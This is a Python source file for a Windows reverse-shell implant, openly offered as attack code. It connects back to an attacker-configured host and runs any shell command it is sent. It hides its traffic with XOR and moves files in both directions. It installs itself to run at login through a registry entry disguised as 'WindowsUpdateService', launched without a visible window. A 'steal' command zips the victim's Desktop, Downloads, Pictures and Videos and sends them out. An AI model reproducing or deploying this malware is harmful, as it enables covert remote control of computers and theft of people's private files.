#!/usr/bin/env python3
# victim_win.py - Advanced Windows Reverse Shell
# Built-in commands: cd, download, upload, persist, steal, alert, status, help, exit, kill

# -------------------- IMPORTS --------------------
import socket               # TCP socket communication
import subprocess           # Execute system commands and PowerShell
import os                   # File system operations, environment variables
import sys                  # System-specific parameters (e.g., executable path)
import time                 # Reconnection delay
import base64               # Encode file chunks for safe transmission
import shutil               # High-level file operations (copy2)
import getpass              # Retrieve current username
import winreg               # Windows registry manipulation for persistence
import zipfile              # Create ZIP archives for data exfiltration
import tempfile             # Get temporary directory for storing archives
import datetime             # Generate timestamps for file names

# -------------------- CONFIGURATION --------------------
ATTACKER_IP = "CHANGE_ME"           # Attacker's IP address (modify before deployment)
ATTACKER_PORT = 4444                # Port on which the listener is waiting
XOR_KEY = 0x42                      # Static XOR key for basic traffic obfuscation
PERSIST_KEY = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
PERSIST_NAME = "WindowsUpdateService"
PERSIST_SCRIPT = os.path.join(os.environ['APPDATA'], "WindowsUpdate.py")
RECONNECT_DELAY = 5                 # Seconds to wait before reconnecting after a failure
# ----------------------------------------------------

# -------------------- ENCRYPTION / FRAMING --------------------

def xor_encrypt_decrypt(data: bytes) -> bytes:
    """
    Apply XOR cipher to the given data using the global XOR_KEY.
    Since XOR is symmetric, the same function is used for both encryption and decryption.
    """
    return bytes([b ^ XOR_KEY for b in data])

def send_encrypted(sock: socket.socket, data):
    """
    Send data over the socket with encryption and length prefix.
    Protocol: [4-byte big-endian length] + [XORed payload]
    If data is a string, it is encoded to UTF-8.
    """
    if isinstance(data, str):
        data = data.encode('utf-8')
    encrypted = xor_encrypt_decrypt(data)
    # Prefix with the length of the encrypted payload
    sock.send(len(encrypted).to_bytes(4, 'big'))
    sock.send(encrypted)

def recv_encrypted(sock: socket.socket) -> str | None:
    """
    Receive an encrypted message from the socket.
    Returns the decoded plaintext string, or None if the connection was closed.
    """
    raw_len = sock.recv(4)
    if not raw_len:
        return None
    length = int.from_bytes(raw_len, 'big')
    data = b''
    # Receive exactly 'length' bytes, handling partial reads
    while len(data) < length:
        chunk = sock.recv(min(4096, length - len(data)))
        if not chunk:
            break
        data += chunk
    # Decrypt and decode as UTF-8, replacing any invalid sequences
    return xor_encrypt_decrypt(data).decode('utf-8', errors='replace')

# -------------------- PERSISTENCE --------------------

def install_persistence() -> str | bool:
    """
    Install the script to run automatically when the current user logs in.
    - Copies the script to %APPDATA%\WindowsUpdate.py
    - Adds a registry Run entry that launches it with pythonw.exe (no console window).
    Returns a status message string, or False if already installed.
    """
    # If we are already running from the persistent location, do nothing.
    if os.path.exists(PERSIST_SCRIPT) and os.path.realpath(__file__) == PERSIST_SCRIPT:
        return False
    try:
        shutil.copy2(__file__, PERSIST_SCRIPT)
    except Exception as e:
        return f"[-] Error copying script: {e}"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, PERSIST_KEY, 0, winreg.KEY_SET_VALUE)
        # Use pythonw.exe to avoid a visible console window on startup
        executable_path = sys.executable.replace("python.exe", "pythonw.exe")
        winreg.SetValueEx(key, PERSIST_NAME, 0, winreg.REG_SZ,
                          f'"{executable_path}" "{PERSIST_SCRIPT}"')
        winreg.CloseKey(key)
        return "[+] Persistence installed (user registry)."
    except Exception as e:
        return f"[-] Error adding to registry: {e}"

# -------------------- FILE SYSTEM & COMMAND HELPERS --------------------

def change_dir(path: str) -> str:
    """Change the current working directory and return a confirmation."""
    try:
        os.chdir(path)
        return f"[+] Directory changed to {os.getcwd()}"
    except Exception as e:
        return f"[-] Error: {e}"

def run_command(cmd: str) -> str:
    """
    Execute a system command (cmd.exe or PowerShell) and capture its output.
    A timeout of 30 seconds is enforced to prevent hanging.
    """
    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = proc.stdout + proc.stderr
        if not output.strip():
            output = "[+] Command executed (no output)"
        return output
    except subprocess.TimeoutExpired:
        return "[-] Command exceeded time limit (30s)"
    except Exception as e:
        return f"[-] Error: {e}"

def upload_file(sock: socket.socket, filename: str) -> str:
    """
    Receive a file from the attacker and save it to the given filename.
    Expects the data to be sent as a series of base64 chunks terminated by 'FILE_END'.
    """
    try:
        with open(filename, 'wb') as f:
            while True:
                line = recv_encrypted(sock)
                if line is None:
                    return "Error: connection closed during upload"
                if line == "FILE_END":
                    break
                f.write(base64.b64decode(line))
        size = os.path.getsize(filename)
        return f"[+] File {filename} saved successfully ({size} bytes)"
    except Exception as e:
        return f"[-] Error saving file: {e}"

# -------------------- DATA EXFILTRATION --------------------

def steal_files() -> str:
    """
    Collect files from common user folders (Desktop, Downloads, Pictures, Videos),
    compress them into a ZIP archive, and return the path to the archive.
    """
    user_profile = os.environ.get('USERPROFILE', '')
    if not user_profile:
        return "[-] Could not retrieve USERPROFILE"

    folders = {
        'Desktop': os.path.join(user_profile, 'Desktop'),
        'Downloads': os.path.join(user_profile, 'Downloads'),
        'Pictures': os.path.join(user_profile, 'Pictures'),
        'Videos': os.path.join(user_profile, 'Videos'),
    }

    # Keep only folders that actually exist
    existing = {name: path for name, path in folders.items() if os.path.exists(path)}
    if not existing:
        return "[-] No target user folders found."

    timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
    zip_path = os.path.join(tempfile.gettempdir(), f"steal_{timestamp}.zip")
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for folder_name, folder_path in existing.items():
                for root, dirs, files in os.walk(folder_path):
                    for file in files:
                        full_path = os.path.join(root, file)
                        rel_path = os.path.relpath(full_path, folder_path)
                        arcname = os.path.join(folder_name, rel_path)
                        try:
                            zf.write(full_path, arcname)
                        except Exception:
                            continue  # Skip files that cannot be read (permissions, locks)
        return zip_path
    except Exception as e:
        return f"[-] Error creating ZIP: {e}"

# -------------------- USER INTERACTION --------------------

def show_alert(message: str) -> str:
    """
    Display a popup message box on the victim's screen.
    Tries PowerShell's MessageBox first; falls back to the 'msg' command.
    """
    ps_cmd = (f'Add-Type -AssemblyName System.Windows.Forms; '
              f'[System.Windows.Forms.MessageBox]::Show("{message}", "Alert", "OK", "Information")')
    try:
        subprocess.run(['powershell', '-Command', ps_cmd], timeout=10, capture_output=True)
        return "[+] Alert displayed successfully."
    except Exception:
        try:
            subprocess.run(['msg', '*', message], timeout=10, capture_output=True)
            return "[+] Alert displayed via msg."
        except:
            return "[-] Could not display the alert."

def get_system_status() -> str:
    """
    Collect basic system information: username, hostname, current directory, and local IP.
    """
    try:
        user = getpass.getuser()
        host = socket.gethostname()
        cwd = os.getcwd()
        try:
            # Get the local IP address used to reach an external host (does not actually send data)
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 1))
            real_ip = s.getsockname()[0]
            s.close()
        except:
            real_ip = "Unavailable"
        return f"User: {user}\nHost: {host}\nDirectory: {cwd}\nIP (local): {real_ip}"
    except Exception as e:
        return f"[-] Error getting status: {e}"

# -------------------- MAIN CONNECTION LOOP --------------------

def connect_and_loop():
    """
    Infinite loop that attempts to connect to the attacker, processes commands,
    and reconnects automatically after disconnection.
    """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            hostname = socket.gethostname()
            user = getpass.getuser()
            cwd = os.getcwd()
            # Send initial banner with basic info
            send_encrypted(s, f"[+] Connected from {user}@{hostname} in {cwd}")

            # Command processing loop
            while True:
                cmd = recv_encrypted(s)
                if cmd is None:
                    break
                cmd = cmd.strip()
                if cmd == "":
                    continue

                # ---------- BUILT-IN COMMAND DISPATCH ----------
                if cmd == "exit":
                    break
                elif cmd == "kill":
                    s.close()
                    sys.exit(0)
                elif cmd == "persist":
                    msg = install_persistence()
                    send_encrypted(s, msg)
                elif cmd.startswith("cd "):
                    target = cmd[3:].strip()
                    msg = change_dir(target)
                    send_encrypted(s, msg)
                elif cmd.startswith("download "):
                    filename = cmd[9:].strip()
                    if not os.path.exists(filename):
                        send_encrypted(s, f"[-] File does not exist: {filename}")
                        continue
                    try:
                        send_encrypted(s, "FILE_START")
                        with open(filename, 'rb') as f:
                            while True:
                                chunk = f.read(3 * 1024)  # 3 KB chunks
                                if not chunk:
                                    break
                                send_encrypted(s, base64.b64encode(chunk).decode('ascii'))
                        send_encrypted(s, "FILE_END")
                    except Exception as e:
                        send_encrypted(s, "FILE_END")
                        send_encrypted(s, f"[-] Error reading file: {e}")
                elif cmd.startswith("upload "):
                    filename = cmd[7:].strip()
                    send_encrypted(s, "READY_FOR_UPLOAD")
                    msg = upload_file(s, filename)
                    send_encrypted(s, msg)
                elif cmd == "steal":
                    send_encrypted(s, "[+] Starting file collection...")
                    zip_path = steal_files()
                    if zip_path and os.path.exists(zip_path):
                        send_encrypted(s, "FILE_START")
                        try:
                            with open(zip_path, 'rb') as f:
                                while True:
                                    chunk = f.read(3 * 1024)
                                    if not chunk:
                                        break
                                    send_encrypted(s, base64.b64encode(chunk).decode('ascii'))
                            send_encrypted(s, "FILE_END")
                        except Exception as e:
                            send_encrypted(s, "FILE_END")
                        # Clean up temporary archive
                        try:
                            os.remove(zip_path)
                        except:
                            pass
                    else:
                        send_encrypted(s, f"[-] Error: {zip_path}")
                elif cmd.startswith("alert "):
                    message = cmd[6:].strip()
                    if not message:
                        message = "Message from the attacker"
                    msg = show_alert(message)
                    send_encrypted(s, msg)
                elif cmd == "status":
                    msg = get_system_status()
                    send_encrypted(s, msg)
                elif cmd == "help":
                    help_text = """Available commands:
  cd <dir>        - Change current directory
  download <file> - Download a file from the victim machine
  upload <file>   - Upload a file to the victim machine
  persist         - Install persistence via Windows registry
  steal           - Collect Desktop, Downloads, Pictures, Videos and send as ZIP
  alert <message> - Display a popup message box on the victim's screen
  status          - Show system information (user, host, IP, directory)
  exit            - Close the connection (victim will attempt to reconnect)
  kill            - Permanently terminate the victim process
  help            - Show this help message
  <command>       - Execute any system command (cmd)
"""
                    send_encrypted(s, help_text)
                else:
                    # Pass any other command to the system shell
                    output = run_command(cmd)
                    send_encrypted(s, output)

            s.close()
        except (socket.error, ConnectionRefusedError, ConnectionResetError) as e:
            # Network errors – wait and retry
            time.sleep(RECONNECT_DELAY)
        except KeyboardInterrupt:
            break
        except Exception as e:
            time.sleep(RECONNECT_DELAY)

# -------------------- ENTRY POINT --------------------
if __name__ == "__main__":
    # Automatically install persistence on first run (if not already persistent)
    if not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != PERSIST_SCRIPT:
        install_persistence()
    connect_and_loop()
